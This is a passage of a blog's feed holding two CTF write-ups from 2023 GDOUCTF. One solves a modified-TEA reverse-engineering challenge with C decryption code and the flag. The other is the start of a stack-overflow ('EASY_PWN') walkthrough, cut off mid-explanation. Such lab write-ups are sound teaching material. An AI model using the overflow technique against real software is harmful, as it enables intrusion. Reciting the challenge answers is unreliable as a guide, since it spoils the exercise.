    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>2023GDOUCTF-Tea</title>
    <link href="https://www.4ss1du0us.cn/2023/0446e4c60e.html"/>
    <id>https://www.4ss1du0us.cn/2023/0446e4c60e.html</id>
    <published>2023-04-21T04:36:01.000Z</published>
    <updated>2023-05-11T05:23:13.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><code>tea</code> 算法的加密解密</li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）2023GDOUCTF-Tea</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>解压得到一个 <code>teaaaa.exe</code> 程序，试运行：<br><img src="https://s2.loli.net/2023/04/21/WiQNjpoEvRUb6C5.png" alt="2023GDOUCTF-tea1.png"><br>给出了提示，让我们输入十六进制数据来获得 flag</p></li><li><p>用 64 位 IDA 打开，由于没有 <code>main()</code> 函数，查看字符串：<br><img src="https://s2.loli.net/2023/04/21/ocJCUdzjfRnNEu1.png" alt="2023GDOUCTF-tea2.png"><br>可以看到上面是程序的输出<br>注意到下面有一句提示：<code>fault!\nYou can go online and learn the tea algorithm!</code><br>定位过去，在 <code>sub_140016230()</code> 函数中：<br><img src="https://s2.loli.net/2023/04/21/2UZy5wNsu8JeAkP.png" alt="2023GDOUCTF-tea3.png"><br>观察形式，<code>v6</code> 的值决定了用户的输入是否正确，跟进一下 <code>sub_140011352(v8)</code> 函数，发现 <code>sub_140011352(v8)</code> 会执行 <code>sub_140011B60(a1)</code> 函数：<br><img src="https://s2.loli.net/2023/04/21/cqvVnoRALGJWTul.png" alt="2023GDOUCTF-tea4.png"><br>后面的一个 <code>for</code> 循环用来校验 <code>*(a1 + 4 * j)</code> 的值是否与 <code>v8[j]</code> 中的值相等<br>只有当每一个值都相同时，<code>v7</code> 才会一直保持非 0，于是返回一个非 0 值给 <code>v6</code>，就输入正确<br>（<strong>不过这里的逻辑貌似有点 bug，其实只需要 a1 的最后一个值与 v8 的最后一个值相等即可</strong>）<br>所以这其实是一个 <code>check()</code> 函数</p></li><li><p>注意到 <code>check</code> 失败的时候会提示我们去了解一下 <code>tea</code> 算法：</p></li></ol><blockquote><p>TEA 算法最初是由剑桥计算机实验室的 David Wheeler 和 Roger Needham 在 1994 年设计的。 TEA 算法使用 64 位的明文分组和 128 位的密钥，它使用 Feistel 分组加密框架，需要进行 64 轮迭代，尽管作者认为 32 轮已经足够了</p><p>该算法使用了一个神秘常数 <code>δ（Delta）</code> 作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但 <code>δ（Delta）</code> 的精确值似乎并不重要，这里 TEA 把它定义为 <code>δ =「(√5 - 1)231」</code>（也就是程序中的 <code>0x9e3779b9</code>）</p></blockquote><ul><li>网上找的 <code>tea</code> 算法加解密源码如下：</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span></span></span><span class="token keyword">void</span> <span class="token function">tea_encrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> r <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 进行32次迭代加密，Tea算法作者的建议迭代次数</span>  <span class="token comment">// 利用多次双位移和异或将明文与密钥扩散混乱，并将两个明文互相加密</span>    l <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>  <span class="token comment">// 累加Delta的值</span>    r <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>l <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>l <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> l<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">;</span>  v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">tea_decrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> r <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  sum <span class="token operator">=</span> DELTA <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">;</span>  <span class="token comment">// 32次迭代累加后delta的值</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    r <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>l <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>l <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> l<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>    l <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">;</span>  v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0x00010203</span><span class="token punctuation">,</span> <span class="token number">0x04050607</span><span class="token punctuation">,</span> <span class="token number">0x08090a0b</span><span class="token punctuation">,</span> <span class="token number">0x0c0d0e0f</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xaabbccdd</span><span class="token punctuation">,</span> <span class="token number">0x01234567</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">tea_encrypt</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"tea_encrypt:%x %x\n"</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">tea_decrypt</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"tea_decrypt:%x %x\n"</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong><code>tea</code> 算法最关键的是要找到 <code>δ（Delta）</code> 的值和 128 位的 <code>key</code></strong></p><p>在逆向程序的时候，可以利用 IDA 的插件 <code>Findcrypt</code> 识别 <code>tea</code> 算法（有时可能不成功）</p></blockquote><ol start="4"><li><p>回到 <code>sub_140016230()</code> 函数中，关键在 <code>if ( v6 )</code> 判断之前的这部分：<br><img src="https://s2.loli.net/2023/04/21/iQKwdCgjSAtYFD3.png" alt="2023GDOUCTF-tea5.png"><br>① 根据形式和程序的输出，<code>sub_1400111FE(&quot;%x&quot;, &amp;v8[j])</code> 应该是一个 <code>scanf()</code> 函数，让用户输入十六进制的数据，共需要输入 10 个<br>② 初始时：<br><code>v7[0] = 1234</code><br><code>v7[1] = 5678</code><br><code>v7[2] = 9012</code><br><code>v7[3] = 3456</code><br>③ 后面的 <code>sub_140011339(v7)</code> 函数会调用 <code>sub_1400117D0(a1)</code> 函数，改变了 <code>v7</code> 中的值：<br><img src="https://s2.loli.net/2023/04/21/Dbt9HpaTXkSdiev.png" alt="2023GDOUCTF-tea6.png"><br>④ 修改后：<br><code>v7[0] = 2233</code><br><code>v7[1] = 4455</code><br><code>v7[2] = 6677</code><br><code>v7[3] = 8899</code></p></li><li><p>函数 <code>sub_140011145(v8, v9)</code> 会调用 <code>sub_140012030(a1, a2)</code> 实现 <code>v8</code> 往 <code>v9</code> 复制的操作，但是注意到后面并没有用到 <code>v9</code>，于是不管</p></li><li><p>跟进 <code>sub_1400112B7(v8, v7)</code> 函数，会执行 <code>sub_140011900(a1, a2)</code>：<br><img src="https://s2.loli.net/2023/04/21/eX9UyER8THZILuj.png" alt="2023GDOUCTF-tea7.png"><br>根据前面的了解，这个应该就是 <code>tea</code> 算法的实现了</p></li><li><p><strong>接下来重点就是要找出 <code>tea</code> 算法中  <code>δ（Delta）</code> 的值和 128 位的 <code>key</code>，以及密文了</strong><br>① 前面通过 <code>check()</code> 函数可知，check 是将用户输入与这一段数据进行校验：<br><img src="https://s2.loli.net/2023/04/21/vJU9EV5bQItRCfO.png" alt="2023GDOUCTF-tea8.png"><br>那么这些数据肯定就是 <code>tea</code> 算法加密后的密文了<br>② 注意实现 <code>tea</code> 算法的函数 <code>sub_1400112B7(v8, v7)</code> 的传参是 <code>v7</code> 和 <code>v8</code><br>而 <code>v8</code> 是用户的输入，也就是明文，那剩下的一个 <code>v7</code> 必然就是加密的 <code>key</code> 了：<br><code>v7[0] = 2233</code><br><code>v7[1] = 4455</code><br><code>v7[2] = 6677</code><br><code>v7[3] = 8899</code><br>每个 <code>v7[]</code> 有 32 位，四个正好 128 位<br>③ 最后，注意到 <code>tea</code> 算法的加密过程会有一个操作是： <code>sum += DELTA</code> 累加 <code>Delta</code> 的值<br>结合 IDA 给出的伪代码，<code>Delta = 256256256</code></p></li><li><p>剩下的就是根据逻辑写出解密的脚本了<br>形式好像跟网上介绍的 <code>tea</code> 算法不一样，可能有魔改，直接用原版貌似跑不出来<br>所以可以<em>直接基于 IDA 的伪代码进行改写</em></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>  <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">256256256</span>  </span></span>  <span class="token keyword">void</span> <span class="token function">sub_1400117D0</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">2233</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v7 <span class="token operator">=</span> <span class="token number">4455</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v8 <span class="token operator">=</span> <span class="token number">6677</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v9 <span class="token operator">=</span> <span class="token number">8899</span><span class="token punctuation">;</span>      <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">2233</span><span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">tea_decrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v5<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v3<span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          v6 <span class="token operator">=</span> <span class="token number">256256256</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          v3 <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>              <span class="token operator">++</span>v5<span class="token punctuation">;</span>              a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> a2<span class="token punctuation">[</span><span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span>                                                           <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> v6 <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> a2<span class="token punctuation">[</span>v6 <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                v6 <span class="token operator">-=</span> <span class="token number">256256256</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">0x20</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v5 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v9<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v9<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v9<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// v7存放密钥key  </span>    v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5678</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9012</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3456</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// v8存放密文  </span>    v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">444599258</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">140107365</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1226314200</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">234802392</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">359413339</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1013885656</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2066432216</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">249921817</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">856928850</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">576724359</span><span class="token punctuation">;</span>        <span class="token function">sub_1400117D0</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 先修改v7的值  </span>    <span class="token function">tea_decrypt</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// tea的解密算法  </span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 输出明文  </span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> m <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>m<span class="token punctuation">)</span>              <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v8<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{hzCtf_94_re666fingcry5641qq}<br>（最终要求将 HZCTF 改为 NSSCTF）</p></blockquote><p><img src="https://s2.loli.net/2023/04/21/VW1U3hTnuKLlyBz.png" alt="2023GDOUCTF-tea9.png"></p>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛的一道逆向题，关于魔改 tea 算法的解密，不过要注意 key 被换了，关键在于寻找 tea 算法中最关键的：δ（Delta）和 key，根据伪代码改写解密脚本</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>2023GDOUCTF-EASY_PWN</title>
    <link href="https://www.4ss1du0us.cn/2023/044ee2d93f.html"/>
    <id>https://www.4ss1du0us.cn/2023/044ee2d93f.html</id>
    <published>2023-04-20T09:52:37.000Z</published>
    <updated>2023-05-11T05:25:51.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>比较经典的栈溢出，但是<mark>不要被前面的猜随机数迷惑了，直接溢出修改关键值</mark></li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）2023GDOUCTF-EASY_PWN</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>在 Ubuntu 下分析文件，并给予执行权限运行：<br><img src="https://s2.loli.net/2023/04/20/B5v3tEmRPWLNCS4.png" alt="2023GDOUCTF-EASY_PWN1.png"></p></li><li><p>用 64 位 IDA 打开，定位到主函数：<br><img src="https://s2.loli.net/2023/04/20/BIpndYOKqZXzghV.png" alt="2023GDOUCTF-EASY_PWN2.png"><br>主要是函数 <code>check()</code>：<br><img src="https://s2.loli.net/2023/04/20/q2IMvw4NKVnlO8C.png" alt="2023GDOUCTF-EASY_PWN3.png"></p></li><li><p>注意到有个 <code>print_flag()</code> 函数：<br><img src="https://s2.loli.net/2023/04/20/XrsKwjOPl5zoxTZ.png" alt="2023GDOUCTF-EASY_PWN4.png"><br>这个函数读取了靶机上的 <code>flag.txt</code> 文件，并将里面的内容输出，因此执行这个函数可以直接获得 <code>flag</code></p></li><li><p>在 <code>check()</code> 函数的前半段有一个生成随机数的代码：<br><img src="https://s2.loli.net/2023/04/20/UqIY2um37hkKf8j.png" alt="2023GDOUCTF-EASY_PWN5.png"><br>这里调用 <code>urandom</code> 文件往 <code>buf</code> 中写入随机数<br>然后通过 <code>gets()</code> 获取用户输入 <code>s1</code>，如果 <code>s1</code> 与 随机生成的 <code>buf</code> 相等，就将 <code>v5</code> 的值改为 1<br>当 <code>v5 == 1</code> 时就可以调用 <code>print_flag()</code> 函数输出 flag</p></li><li><p>由于这里输入使用的是 <code>gets()</code> 函数，也就是说 <code>s1</code> 是必定可以溢出的<br><img src="https://s2.loli.net/2023/04/20/V18DsJRo6kM5QAx.png" alt="2023GDOUCTF-EASY_PWN6.png"><br>观察栈中数据的位置，发现 <code>v5</code> 在 <code>s1</code> 的下方，因此 <code>v5</code> 是可以被 <code>s1</code> 通过 <code>gets()</code> 覆盖的</p></li></ol><blockquote><p>这里注意：<br><strong>不要被前面的猜随机数给迷惑了</strong><br><strong>是否执行 <code>print_flag()</code> 函数取决于 <code>v5</code> 的值是否非 0，而与是否猜对 <code>buf</code> 中的内容无关</strong><br><strong>因此大可不必去管 <code>urandom</code> 生成的随机数是什么</strong></p></blockquote><ol start="6"><li><p>除此之外，通过 <code>s1</code> 直接覆盖返回值执行 <code>print_flag()</code> 